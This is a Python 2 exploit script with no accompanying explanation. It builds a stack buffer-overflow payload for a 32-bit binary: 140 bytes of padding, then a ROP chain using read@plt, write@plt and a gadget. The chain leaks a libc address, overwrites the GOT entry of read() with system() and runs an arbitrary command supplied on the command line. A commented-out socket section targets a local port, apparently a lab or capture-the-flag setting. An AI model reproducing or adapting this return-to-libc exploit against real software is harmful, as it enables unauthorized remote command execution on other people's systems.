#!/usr/bin/python
import string
import struct
import os, sys, socket

#s = "".join([4*c for c in string.ascii_uppercase])
#s = s + s
cmd = sys.argv[1] + '\0'
read_offset   = 0x000d5980
system_offset = 0x0003ada0

# pad input to reach return address
s = "A" * 140

# read() a command from stdin to .dynamic
s += struct.pack("<I", 0x0804832c) #read@plt
s += struct.pack("<I", 0x080484b6) #pppr
s += struct.pack("<I", 0x00000000) #stdin
s += struct.pack("<I", 0x08049530) #.dynamic
s += struct.pack("<I", len(cmd))   #length of command

# write() read()'s address from the got to stdout
s += struct.pack("<I", 0x0804830c) #write@plt
s += struct.pack("<I", 0x080484b6) #pppr
s += struct.pack("<I", 0x00000001) #stdout
s += struct.pack("<I", 0x0804961c) #read()'s got entry
s += struct.pack("<I", 0x00000004) #length of read()'s address

# read() the address of system() from stdin to read()'s got entry
s += struct.pack("<I", 0x0804832c) #read@plt
s += struct.pack("<I", 0x080484b6) #pppr
s += struct.pack("<I", 0x00000000) #stdin
s += struct.pack("<I", 0x0804961c) #read()'s got entry
s += struct.pack("<I", 0x00000004) #length of read()'s address

# call system() with the command in .dynamic as an argument
s += struct.pack("<I", 0x0804832c) #read@plt
s += struct.pack("<I", 0x41414141) #fake return address
s += struct.pack("<I", 0x08049530) #.dynamic


#sock_addr = ("127.0.0.1", 1337)
#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#sock.connect(sock_addr)

#sock.send(s)
print s

#sock.send(cmd)
print cmd

## calculate address of system() and send it
#read_address = struct.unpack("<I", sock.recv(1024))[0]
#print "read() found at {}".format(hex(read_address))
#
#system_address = read_address - read_offset + system_offset
#print "system() found at {}".format(hex(system_address))
#
##sock.send(struct.pack("<I", system_address))
#print struct.pack("<I", system_address)
